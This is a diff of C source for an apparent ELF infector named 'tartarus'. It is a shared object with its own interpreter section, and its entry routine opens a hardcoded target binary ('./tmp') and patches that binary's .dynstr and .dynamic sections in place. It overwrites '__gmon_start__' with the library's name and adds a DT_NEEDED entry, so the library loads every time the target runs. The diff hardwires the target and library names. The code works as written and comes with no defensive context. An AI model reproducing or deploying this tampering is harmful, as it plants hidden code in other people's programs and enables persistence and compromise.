@@ -10,86 +10,79 @@
 #include <errno.h>
 
 #define lib "./test.so"
+#define self "tartarus.so"
+#define target "./tmp"
 
-const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"; //INTERP;
+const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2";
 
 void entry(){
-  // this is a cheap hack to get argc and argv off the stack since stdcall attribute is always ignored
-  volatile uint64_t tmp; 
-  int argc = *((char*)&tmp+0x60); // must be edited any time a locally scoped variable is added that adjusts stack locations
-  char** argv = (char**)((char*)&tmp+0x68);
-
-  int len = strlen(&argv[0][2]);
+  int fd = open(target, O_RDWR);
+  void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file
   
-  if(argc == 2){
-    int fd = open(argv[1], O_RDWR);
-    void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file
-
-    Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
-    unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
-    
-    Elf64_Shdr* shdr = (Elf64_Shdr*)(base + ehdr->e_shoff);
-
-    Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + base);
-
-    char* dyn_str = NULL;
-
-    char* strtab = (char*)(base + shstrtab->sh_offset);
-
-    unsigned int dynstr_size = 0;
-
-    Elf64_Dyn* dynamic = NULL;
-    unsigned int dyn_cnt = 0;
-
-    int flag = 0;
-    
-    // find needed sections
-    for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
-      if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
-	dyn_str = (char*)ehdr + shdr->sh_offset;
-	dynstr_size = shdr->sh_size;
-	if(shdr[1].sh_offset - shdr->sh_offset >= sizeof(Elf64_Dyn)){
-	  flag = 1;
-	}
-      }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
-	dynamic = (Elf64_Dyn*)((char*)ehdr + shdr->sh_offset);
-	dyn_cnt = shdr->sh_size / sizeof(Elf64_Dyn);
+  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
+  unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
+  
+  Elf64_Shdr* shdr = (Elf64_Shdr*)(base + ehdr->e_shoff);
+  
+  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + base);
+  
+  char* dyn_str = NULL;
+  
+  char* strtab = (char*)(base + shstrtab->sh_offset);
+  
+  unsigned int dynstr_size = 0;
+  
+  Elf64_Dyn* dynamic = NULL;
+  unsigned int dyn_cnt = 0;
+  
+  int flag = 0;
+  
+  // find needed sections
+  for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
+    if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
+      dyn_str = (char*)ehdr + shdr->sh_offset;
+      dynstr_size = shdr->sh_size;
+    }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
+      dynamic = (Elf64_Dyn*)((char*)ehdr + shdr->sh_offset);
+      dyn_cnt = shdr->sh_size / sizeof(Elf64_Dyn);
+      if(shdr[1].sh_offset - shdr->sh_offset >= sizeof(Elf64_Dyn)){
+	flag = 1;
       }
-      shdr++;
     }
-
-    // replace __gmon_start__ with SO name
-    char* str = dyn_str + 1;
-    while(1){
-      if(!strcmp(str, "__gmon_start__")){
-	strcpy(str, &argv[0][2]);
+    shdr++;
+  }
+  
+  // replace __gmon_start__ with SO name
+  char* str = dyn_str + 1;
+  while(1){
+    if(!strcmp(str, "__gmon_start__")){
+      strcpy(str, self);
+      break;
+    }
+    str += strlen(str) + 1;
+  }
+  
+  if(flag){
+    // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
+    memmove(dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn));
+    dynamic->d_tag = DT_NEEDED;
+    dynamic->d_un.d_val = str - dyn_str;
+  }else{
+    // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
+    for(int i = 0; i < dyn_cnt; ++i){
+      if(dynamic->d_tag == DT_DEBUG){
+	dynamic->d_tag = DT_NEEDED;
+	dynamic->d_un.d_val = str - dyn_str;
 	break;
       }
-      str += strlen(str) + 1;
+      dynamic++;
     }
-
-    if(flag){
-      // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
-      memmove(dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn));
-      dynamic->d_tag = DT_NEEDED;
-      dynamic->d_un.d_val = str - dyn_str;
-    }else{
-      // loop through Dyn struct array to find dt_debug field
-      for(int i = 0; i < dyn_cnt; ++i){
-	if(dynamic->d_tag == DT_DEBUG){
-	  dynamic->d_tag = DT_NEEDED;
-	  dynamic->d_un.d_val = str - dyn_str;
-	  break;
-	}
-	dynamic++;
-      }
-    }
-    
-    msync(base, 0x300000, MS_SYNC);
-    munmap(base, 0x300000);
-    
-    close(fd);
   }
+  
+  msync(base, 0x300000, MS_SYNC);
+  munmap(base, 0x300000);
+  
+  close(fd);
   _exit(0);
 }
 
